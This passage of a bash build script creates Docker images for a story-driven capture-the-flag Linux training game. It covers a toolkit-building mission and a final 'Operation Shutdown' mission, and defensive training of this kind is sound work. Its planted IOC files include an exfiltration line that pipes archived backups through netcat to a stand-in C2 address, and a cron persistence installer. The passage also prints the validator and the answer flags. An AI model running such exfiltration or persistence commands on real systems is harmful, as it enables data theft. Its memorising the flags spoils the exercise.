╚══════════════════════════════════════════════════════════════╝

FROM:    Shyft <president@thelab.local>
TO:      Agent
SUBJECT: Build it right. We're going to need it.

CritterCodes confirmed what we suspected: VECTOR is fully
automated. No human operator. No intuition. Just phases,
timers, and thresholds — executing perfectly, every time.

We've been fighting it with one-liners and manual commands.
That's why we're behind. VECTOR generates faster than we
investigate. The only way to change the math is to automate
our response.

I need a professional investigation toolkit. Something we
can point at any system and get a structured report back.
Something that handles bad arguments gracefully, fails loudly
when something goes wrong, and documents itself.

No silent failures. No crashes on edge cases.
CritterCodes says: "set -e, error handling, argument parsing.
I don't want to find out it failed because of a bad flag."

Build it. The validator will tell you when it's ready.

                                             — Shyft // President

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/shyft_04.txt
          cat ~/inbox/crittercodes_05.txt
──────────────────────────────────────────────────────────────
OBJECTIVE
  Edit ~/workspace/toolkit.sh to pass all 5 checks:
    1. getopts: parse -t <target> -v -o <output> -h
    2. set -euo pipefail
    3. trap ERR with an error message
    4. A heredoc (help text is a great place for this)
    5. At least one function

  Run: bash ~/validate.sh

  When you pass, it prints all 3 flags.
  Target data: ~/target_data/events.log
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/shyft_04.txt << 'EOF'
FROM:    Shyft <president@thelab.local>
TO:      Agent
DATE:    2026-05-17 21:03:44
SUBJECT: What 'good' looks like

I'm going to be direct about what I want.

The toolkit needs to be maintainable. That means:
- Arguments parsed with getopts, not positional parameters
- Strict mode (set -euo pipefail) so silent failures are impossible
- An ERR trap so any unexpected failure is logged, not swallowed
- A heredoc for the help text (readable, not a mess of echos)
- Functions so logic is reusable and testable

This isn't perfectionism. After Mission 4, we know VECTOR can
corrupt our tools. A professional script is harder to subtly
break than a pile of ad-hoc commands. The structure is
the defense.

When the validator passes, you'll have the framework for
Operation Shutdown. One more mission. Then we end this.

                                             — Shyft
EOF

RUN cat > /home/agent/inbox/crittercodes_05.txt << 'EOF'
FROM:    CritterCodes <ceo@thelab.local>
TO:      Agent
DATE:    2026-05-17 21:29:11
SUBJECT: Technical requirements

Here's exactly what the validator checks:

1. getopts — standard argument parsing
   while getopts ":t:vo:h" opt; do case $opt in ... esac; done
   This handles: -t file.log -v -o report.txt -h

2. set -euo pipefail — strict mode, all three flags
   Put this near the top of the script, after the shebang.

3. trap '...' ERR — error handler
   trap 'echo "Error on line $LINENO"; exit 1' ERR
   This fires whenever a command exits non-zero.

4. Heredoc — use one for your help/usage function
   usage() { cat << HELP
     Usage: $(basename "$0") [-t file] [-v] [-o out] [-h]
   HELP
   }

5. Function — anything counts
   log() { printf '[%s] %s\n' "$(date +%T)" "$*"; }

The template is in ~/workspace/toolkit.sh
The target data is in ~/target_data/events.log
Run: bash ~/validate.sh

                                         — CritterCodes
EOF

# ── Hints ──
RUN cat > /home/agent/hints/script_engineering.txt << 'EOF'
── STRICT MODE ──────────────────────────────────────────────
set -euo pipefail
# -e   exit on error
# -u   error on unset variables
# -o pipefail  catch errors in pipes

── TRAP ─────────────────────────────────────────────────────
trap 'echo "Error on line $LINENO"; exit 1' ERR
trap 'echo "Done."' EXIT
trap 'echo "Interrupted."; exit 130' INT

── getopts ──────────────────────────────────────────────────
TARGET="" VERBOSE=false OUTPUT=""

usage() {
    cat << HELP
Usage: $(basename "$0") [options]
  -t <file>   target file to analyze
  -v          verbose mode
  -o <file>   write output to file
  -h          show this help
HELP
}

while getopts ":t:vo:h" opt; do
    case $opt in
        t) TARGET="$OPTARG" ;;
        v) VERBOSE=true ;;
        o) OUTPUT="$OPTARG" ;;
        h) usage; exit 0 ;;
        :) echo "Option -$OPTARG requires an argument."; exit 1 ;;
        *) echo "Unknown option: -$OPTARG"; exit 1 ;;
    esac
done

── HEREDOC ──────────────────────────────────────────────────
# Unquoted delimiter: variables expand
cat << EOF
Target: $TARGET
Verbose: $VERBOSE
EOF

# Single-quoted delimiter: no expansion (literal)
cat << 'EOF'
$DOLLAR_SIGNS are literal here.
EOF

# Write to a file
cat > /tmp/report.txt << EOF
=== REPORT ===
Date: $(date)
Target: $TARGET
EOF

── FUNCTIONS ────────────────────────────────────────────────
log() {
    local level="$1"; shift
    printf '[%s] %s: %s\n' "$(date +%H:%M:%S)" "$level" "$*"
}

analyze() {
    local file="$1"
    local -i count=0
    while IFS= read -r line; do
        ((count++))
        $VERBOSE && log "DEBUG" "Line $count: $line"
    done < "$file"
    log "INFO" "Processed $count lines from $file"
}
EOF

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
USER agent
ENTRYPOINT ["ttyd", "-W", "-p", "7681", "bash"]
DOCKERFILE

# =============================================================================
# S2-MISSION-10: Operation Shutdown
# Story: All hands. VECTOR's C2 is exposed. 20-minute window. End this.
# Skills: find -mmin, arrays+loops, netstat, report generation, cron hardening
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-10"
cat > "$MISSIONS_DIR/s2-mission-10/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash netcat-openbsd procps findutils gawk 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints \
             /home/agent/suspicious /home/agent/workspace

# ── IOC files ──
RUN cat > /home/agent/suspicious/exfil_script.sh << 'EOF'
#!/bin/bash
# VECTOR exfil script — intercepted before execution
# C2: 10.0.0.99:4444
tar czf /tmp/lab_designs.tar.gz /var/backups/lab_designs/
nc 10.0.0.99 4444 < /tmp/lab_designs.tar.gz
EOF

RUN cat > /home/agent/suspicious/persistence.sh << 'EOF'
#!/bin/bash
# VECTOR persistence installer
# Adds cron job to re-establish C2 connection every 5 minutes
echo "*/5 * * * * /usr/local/bin/syndicate_daemon" | crontab -
EOF

RUN cat > /home/agent/suspicious/vector_config.json << 'EOF'
{
  "vector_version": "2.1.0",
  "c2_server": "10.0.0.99",
  "c2_ports": [4444, 5555, 6666],
  "target": "The Lab — Equipment Design Archive",
  "extraction_window": "2026-05-20T02:00:00Z",
  "phases_complete": 7,
  "phases_total": 8,
  "current_phase": "EXTRACTION_PREP"
}
EOF

# ── Fake nc listeners for port scanner challenge ──
RUN cat > /usr/local/bin/syndicate_listener << 'EOF'
#!/bin/bash
nc -lk -p 4444 > /dev/null 2>&1 &
nc -lk -p 5555 > /dev/null 2>&1 &
nc -lk -p 6666 > /dev/null 2>&1 &
exec sleep infinity
EOF
RUN chmod +x /usr/local/bin/syndicate_listener

# ── Validator ──
RUN cat > /home/agent/validate.sh << 'VALIDATE'
#!/bin/bash
set -uo pipefail

RECON="$HOME/workspace/recon.sh"
PORTSCAN="$HOME/workspace/portscan.sh"
HARDEN="$HOME/workspace/harden.sh"
REPORT="$HOME/workspace/report.txt"
PASS=0; FAIL=0

check() {
    local desc="$1" result="$2"
    if [ "$result" = "pass" ]; then echo "  [PASS] $desc"; ((PASS++))
    else echo "  [FAIL] $desc"; ((FAIL++)); fi
}

echo ""
echo "╔══════════════════════════════════════════════╗"
echo "║  OPERATION SHUTDOWN — VALIDATION             ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# ── Challenge 1: Recon ──
echo "[ CHALLENGE 1: Automated Recon ]"
if [ -f "$RECON" ]; then
    bash "$RECON" > "$REPORT" 2>/dev/null || true
    [ -f "$REPORT" ]                          && r="pass" || r="fail"; check "recon.sh produces report.txt" "$r"
    grep -q 'SUSPICIOUS\|IOC' "$REPORT" 2>/dev/null && r="pass" || r="fail"; check "Report labels IOC files" "$r"
    grep -q 'C2\|10.0.0.99'  "$REPORT" 2>/dev/null && r="pass" || r="fail"; check "Report identifies C2 address" "$r"

    if [ $PASS -ge 2 ]; then
        echo ""
        echo "  FLAG 1: flag{s2_recon_script_done}"
    fi
else
    echo "  Create ~/workspace/recon.sh"
fi

echo ""

# ── Challenge 2: Port scan ──
echo "[ CHALLENGE 2: Port Enumeration ]"
if [ -f "$PORTSCAN" ]; then
    output=$(bash "$PORTSCAN" 2>/dev/null || echo "")
    p4=$(echo "$output" | grep -c '4444' 2>/dev/null || echo 0)
    p5=$(echo "$output" | grep -c '5555' 2>/dev/null || echo 0)
    p6=$(echo "$output" | grep -c '6666' 2>/dev/null || echo 0)
    total=$((p4 + p5 + p6))
    [ "$total" -ge 3 ] && r="pass" || r="fail"; check "Port scanner finds all 3 VECTOR listeners" "$r"

    if [ "$r" = "pass" ]; then
        echo ""
        echo "  FLAG 2: flag{s2_syndicate_neutralized}"
    else
        echo "  Hint: listeners are on localhost ports 4444, 5555, 6666"
    fi
else
    echo "  Create ~/workspace/portscan.sh"
fi

echo ""

# ── Challenge 3: Hardening ──
echo "[ CHALLENGE 3: System Hardening ]"
if [ -f "$HARDEN" ]; then
    grep -q 'chmod'                    "$HARDEN" && r="pass" || r="fail"; check "Removes permissions from IOC files" "$r"
    grep -q 'crontab\|cron'           "$HARDEN" && r="pass" || r="fail"; check "Addresses crontab persistence" "$r"
    grep -q 'suspicious\|vector\|IOC' "$HARDEN" && r="pass" || r="fail"; check "References the IOC directory" "$r"
    actions=$(grep -cE 'chmod|cron|kill|rm -f|pkill' "$HARDEN" 2>/dev/null || echo 0)
    [ "$actions" -ge 3 ] && r="pass" || r="fail"; check "At least 3 hardening actions" "$r"

    if [ $PASS -ge 8 ]; then
        echo ""
        echo "  FLAG 3: flag{s2_the_lab_is_secure}"
        echo ""
        echo "╔══════════════════════════════════════════════╗"
        echo "║  OPERATION SHUTDOWN COMPLETE                 ║"
        echo "╚══════════════════════════════════════════════╝"
        echo ""
        echo "  Persistence: eliminated"
        echo "  C2 channels: blocked"
        echo "  IOC files:   neutralized"
        echo "  Forensic report: filed"
        echo ""
        echo "  VECTOR has gone dark."
        echo ""
        echo "  Intercepted final transmission:"
        echo "  'Impressive. Until next time. — VECTOR'"
        echo ""
        echo "  The Lab wins. Season 2 complete."
    fi
else
    echo "  Create ~/workspace/harden.sh"
fi

echo ""
echo "Total: $PASS checks passed"
VALIDATE
RUN chmod +x /home/agent/validate.sh

# ── Story: README ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-10: Operation Shutdown             [ DIFFICULTY: HARD ] ║
╚══════════════════════════════════════════════════════════════╝

FROM:    Shyft <president@thelab.local>
TO:      ALL PERSONNEL
SUBJECT: This is it. All hands.

We intercepted VECTOR's config file in ~/suspicious/.
The extraction window is in 72 hours: 2026-05-20 02:00 UTC.
Three C2 ports are active on localhost.
Seven of eight phases are complete. Phase 8 is extraction.

We have a window right now — before Phase 8 initializes —
to shut it all down. We need three scripts. Fast.

This is everything we've practiced across nine missions.
Automate it. Move faster than VECTOR can adapt.

The Lab is counting on you.

                                             — Shyft // President

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/all_hands.txt       (all personnel)
          cat ~/inbox/vector_final.txt    (last intercept)
  IOCs:   ~/suspicious/
──────────────────────────────────────────────────────────────
OPERATION SHUTDOWN — THREE SCRIPTS

  [ ] Script 1: ~/workspace/recon.sh
      - Find all IOC files in ~/suspicious/
      - Extract the C2 address from vector_config.json
      - Label them and write output to ~/workspace/report.txt
      - report.txt must contain: SUSPICIOUS or IOC, and 10.0.0.99

  [ ] Script 2: ~/workspace/portscan.sh
      - Scan localhost ports 4000–7000 for open connections
      - Must detect ports 4444, 5555, 6666
      Hint: (echo > /dev/tcp/localhost/$port) 2>/dev/null && echo "OPEN: $port"

  [ ] Script 3: ~/workspace/harden.sh
      - chmod -x all files in ~/suspicious/
      - Check and clear suspicious crontab entries
      - At least 3 distinct hardening actions

  RUN: bash ~/validate.sh
  When all 3 scripts pass — Operation Shutdown is complete.
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/all_hands.txt << 'EOF'
FROM:    Shyft <president@thelab.local>
TO:      ALL LAB PERSONNEL
DATE:    2026-05-17 23:00:00
SUBJECT: ALL HANDS — Operation Shutdown

Everyone. This is it.

We found VECTOR's config file. We know the target, the ports,
the timeline, and the phase count. Phase 8 is extraction.
It hasn't started yet.

CritterCodes is standing by to analyze the forensic report.
Moon Captain has the network tap ready to confirm C2 shutdown.
0xb007ab1e has the equipment archive offline and backed up.

The agent needs to write three scripts:
  recon.sh    — document and surface all IOCs
  portscan.sh — find and expose all C2 listening ports
  harden.sh   — eliminate persistence, lock down the IOC files

When validate.sh passes — it's done.

I've been doing this long enough to know we don't always get
a clean win. Tonight feels different. We know exactly what
VECTOR is, what it's doing, and when it plans to do it.

Tonight, The Lab fights back with code.

Let's go.
                                             — Shyft // President
EOF

RUN cat > /home/agent/inbox/vector_final.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  VECTOR // SYNDICATE AUTONOMOUS SYSTEM  v2.1.0              ║
║  FINAL INTERCEPTED TRANSMISSION                             ║
╚══════════════════════════════════════════════════════════════╝

[AUTOMATED STATUS — CYCLE 71]

Phase 8 pre-check initiated.
C2 connectivity: confirming...
Extraction target: confirmed accessible.
Scheduled window: 2026-05-20T02:00:00Z

Human investigation team has advanced further than
any previous target. Estimated delay introduced: 47 hours.
This is an anomaly. Logging for Syndicate review.

If this transmission is being read by The Lab's agent:

You have been an adequate adversary.
Most targets are neutralized before Phase 6.
You reached Phase 8 analysis. That is noted.

The extraction window will open regardless.
Automation does not tire. Automation does not doubt.
Automation does not stop.

But if you are reading this — perhaps you are faster than calculated.

                    — VECTOR
                      [TRANSMISSION: AUTOMATED]
                      [OPERATOR: NONE]
                      [NEXT CONTACT: PHASE 8 INITIATION]
EOF

# ── Hints ──
RUN cat > /home/agent/hints/automation.txt << 'EOF'
── RECON SCRIPT SKELETON ────────────────────────────────────
#!/bin/bash
set -euo pipefail
REPORT="$HOME/workspace/report.txt"
SUSP="$HOME/suspicious"

{
  echo "=== IOC REPORT — $(date) ==="
  echo ""
  echo "SUSPICIOUS FILES:"
  find "$SUSP" -type f | while read -r f; do
    echo "  IOC: $f"
  done
  echo ""
  echo "C2 ADDRESS:"
  grep -o '10\.[0-9.]*' "$SUSP/vector_config.json" | head -1
} | tee "$REPORT"

── PORT SCANNER SKELETON ────────────────────────────────────
#!/bin/bash
set -uo pipefail
echo "=== PORT SCAN: localhost ==="
for port in $(seq 4000 7000); do
    (echo > /dev/tcp/localhost/$port) 2>/dev/null && \
        echo "OPEN: $port — VECTOR C2 CHANNEL"
done

── HARDENING SCRIPT SKELETON ────────────────────────────────
#!/bin/bash
set -euo pipefail
SUSP="$HOME/suspicious"

echo "[ HARDEN ] Removing execute permissions from IOC files"
find "$SUSP" -type f -exec chmod -x {} \;

echo "[ HARDEN ] Scanning crontab for VECTOR entries"
if crontab -l 2>/dev/null | grep -q 'syndicate\|vector'; then
    crontab -l | grep -vE 'syndicate|vector' | crontab -
    echo "          Persistence entries removed."
else
    echo "          Crontab clean."
fi

echo "[ HARDEN ] Terminating VECTOR processes"
pkill -f syndicate 2>/dev/null && echo "          Processes terminated." || echo "          None found."

echo "[ HARDEN ] Complete. The Lab is secure."
EOF

# ── Entrypoint ──
RUN cat > /usr/local/bin/start.sh << 'EOF'
#!/bin/bash
/usr/local/bin/syndicate_listener &
exec ttyd -W -p 7681 bash
EOF
RUN chmod +x /usr/local/bin/start.sh

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
ENTRYPOINT ["/usr/local/bin/start.sh"]
DOCKERFILE

# =============================================================================
# BUILD ALL SEASON 2 MISSIONS
# =============================================================================
echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║  Building Season 2 — The Syndicate                  ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""

MISSIONS=(s2-mission-01 s2-mission-02 s2-mission-03 s2-mission-04 s2-mission-05 \
          s2-mission-06 s2-mission-07 s2-mission-08 s2-mission-09 s2-mission-10)

for mission in "${MISSIONS[@]}"; do
    echo "─── Building holodeck-${mission} ───"
    docker build \
        --no-cache \
        -t "holodeck-${mission}" \
        "$MISSIONS_DIR/${mission}/" \
        && echo "  ✓ holodeck-${mission}" \
        || echo "  ✗ holodeck-${mission} FAILED"
    echo ""
done

echo "╔══════════════════════════════════════════════════════╗"
echo "║  Season 2 Build Complete                            ║"
echo "╚══════════════════════════════════════════════════════╝"
docker images | grep holodeck-s2
